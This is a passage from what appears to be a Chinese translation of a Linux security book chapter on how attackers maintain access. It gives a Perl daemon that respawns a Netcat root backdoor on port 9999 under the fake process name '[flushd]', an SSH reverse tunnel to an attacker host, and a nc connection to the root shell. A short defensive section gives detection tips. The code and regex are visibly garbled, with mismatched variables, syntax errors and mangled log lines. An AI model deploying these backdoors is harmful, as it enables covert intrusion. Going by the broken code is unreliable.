
# 334 Linux 破解揭秘：Linux 安全秘密与解决方案

`/tmp/root shell` 文件运行 `bash -i`，正如我们在之前的 `inet.d` 示例中所做的那样。我们需要将其放在单独的文件中，因为 `Netcat` 只在 `-e` 参数后允许跟随简单的程序名。作为额外，`Netcat` 相比 `inet.d` 允许我们在 shell 中进行作业控制。

`Netcat` 的设计是为了处理单连接，而不是 `inet.d` 自动执行的无限连接。因此，我们需要编写一些辅助守护进程，每当 `Netcat` 进程退出时自动启动。下面是一个可能的 `Perl` 示例：

```perl
#!/usr/bin/perl

# run root shell.

# Usage:

# 'runno -d to be daemon.

# 'runno' to be Netcat helper program (pseudo shell ).
```

```perl
use POSIX;

$FAKENENAME=[flush];

$S = $0;

# 保存实际的进程名

$0 = $FAKENENAME;

# 隐藏进程名
```

```perl
# 如果我们是由 'nc -e' 启动的，调用时将没有

# 参数，因此作为伪 shell，循环

# 处理输入允许黑客运行命令。

unless (@ARGV) {

    $1;

    open STDERR, "&STDOUT";

    print "Welcome to your root shell.\n";

    print "hackedbox #";

    while (<>) {

        chomp;

        system($_) && print "$!\n"; # 执行命令

        print "hackedbox #";

    }

    exit;

}

# 重定向文件描述符

open STDIN, '/dev/null';

open STDOUT, '/dev/null';

open STDERR, "&STDOUT";

# fork 出并由 init 拥有

fork;

# 与终端脱离

setid;

do {

    print "Running Netcat\n";

    # fork 出并运行 Netcat 程序（隐藏其进程名。）

    unless (open NETCAT, "-l")) {

        exec ("/bin/nc $FAKENAME");

        exit;

    } else {

        # 在 stdin 中发送命令行参数以从 ps 中隐藏

        print NETCAT "-p 9999 -e $ME";

        close NETCAT;

    }

    wait; # 等待 Netcat 完成

    # 永久运行。

} while (1);
```

`fork` 出并脱离控制终端变成守护进程，并在每次 `Netcat` 退出时简单的运行 `Netcat`。`Netcat` 允许我们将命令行作为标准输入，这有助于在 `ps` 中隐藏它们。此外，我们通过更改它们的名称来隐藏 `perl` 和 `Netcat` 程序，以希望管理员不会注意到它们。如果我们使用了 `/tmp/rootshell` 辅助程序，正如我们在第一个示例中所做的那样，我们会在输出中看到 `"/bin/bash"` 和 `"/bin/bash -i"`，这暴露了我们。因此，我们将此脚本作为辅助程序，通过 `system()` 允许用户运行命令。如果我们锁定了进程，将会看到以下内容：

```
hacker$ ps -ef | grep flush | netcat
root      1 0 Dec   00:00:00 [flushd]
root    30757 0 11:55      00:00:00 [flushd]
root    30758 0 11:55      00:00:00 [flushd]
```

进程 `30757` 是 `Netcat` 守护进程，`30758` 是辅助程序。名为 `"flushd"` 的系统守护进程。注意你运行的命令会在 `ps` 中显示：

```
hacker$ ps -ef | grep 30758
root    30757 0 11:55      00:00:00 [flushd]
root    30758 0 18:10      00:00:00 [find -name *.mp -print]
```

所以我们找到了一种无需使用命令在机器上创建 `rootshell` 的方法。有很多其他方法可以实现这一点。在各种主机上提供的几个程序也执行相同的操作。密码——用户必须提供硬编码在二进制文件中的密码。有些甚至伪装成真正的守护进程，例如作为 `HTTP` 服务器响应错误请求。大多数调用 `/bin/bash -i` 来允许你运行命令。

## 入站 Root 防御措施

如果你有进程检查脚本（第 2 章描述），你应该寻找任何带有 `-i` 选项运行的 shell（`bash/ksh/sh/etc`）。匹配此项的良好正则表达式是 `/\b(ba|ba|tc)\b?|b\-S*i*/`。如果是最后那个加密字符串，你应该阅读 `perl` 手页。

> 警告：没有方法可以防止黑客制作 `/bin/sh` `/tmp/lcd` 或其他不匹配模式的文件副本，或者简单地使用自己的假名。

另一个好方法是使用 `lsof`（或类似工具）监控任何具有不同可执行名称（如 `/bin/nc`）并在 `ps` 中查看（如 `[flushd]`）的程序，这些是进程自身的指示。

## 间接入站访问

| 流行度: | 6 |
| :--- | :--- |
| 简单性: | 6 |
| 影响: | 10 |
| 风险等级: | 7 |

示例展示了黑客如何在被黑机器上设置端口，以便他从外部连接并运行命令。如果这些入站连接被阻塞，这些后门命令的形式就是不可用的。

启用远程命令执行的一种方法是从黑机器连接到互联网上的机器，并让黑客的命令通过此连接建立隧道。由于大多数防火墙允许出站访问，这种连接通常是允许的。

假设黑客能够启动一个在 `amanda` 端口上监听带有 root shell 的个人 `inetd` 副本，该端口被互联网屏蔽无法直接连接。访问此端口的一种简单方法是通过 `Sh` 的隧道功能进行：

```
hacker$ ssh -v hacker@example.com -R 9999:localhost:amanda
ssh Version OpenSSH-2.3, protocol versions 1.5/2.0.
debug: Sending randomos youngster
debug: ssh_connect: getuid 1500 geteuid 0 anon 0
debug: Connecting to hacker.example.com [172.18.9.1] port 22.
debug: Sending number generator
debug: Connection established.
debug: Remote protocol version 1.5, remote software version 1.2.27
debug: Local version string SSH-1.5-OpenSSH-2.3
debug: Waiting for server public key.
debug: Received server public key (768 bits) and host key (1024 bits).
debug: Host 'hacker@example.com' is known and matches the RSA host key.
debug: Encryption type: ideal
debug: Sent encrypted key
debug: Installing crc compression attack detector.
debug: Received encrypted confirmation.
debug: Requesting pty.
debug: Connections to remote port 9999 forwarded to localhost:amanda
debug: Establishing shell.
debug: Entering interactive session.
```

# 第 10 章：黑客如何维持访问权限 337

黑客从他的机器连接到被黑机器 `hackedmachine` 上的 root shell，连接到他的本地端口 `9999`：

```
hackerbox$ nc localhost 9999
pwd
/root
uname -n
hackedmachine
```

执行操作后，`SSH` 会话中会显示以下内容：
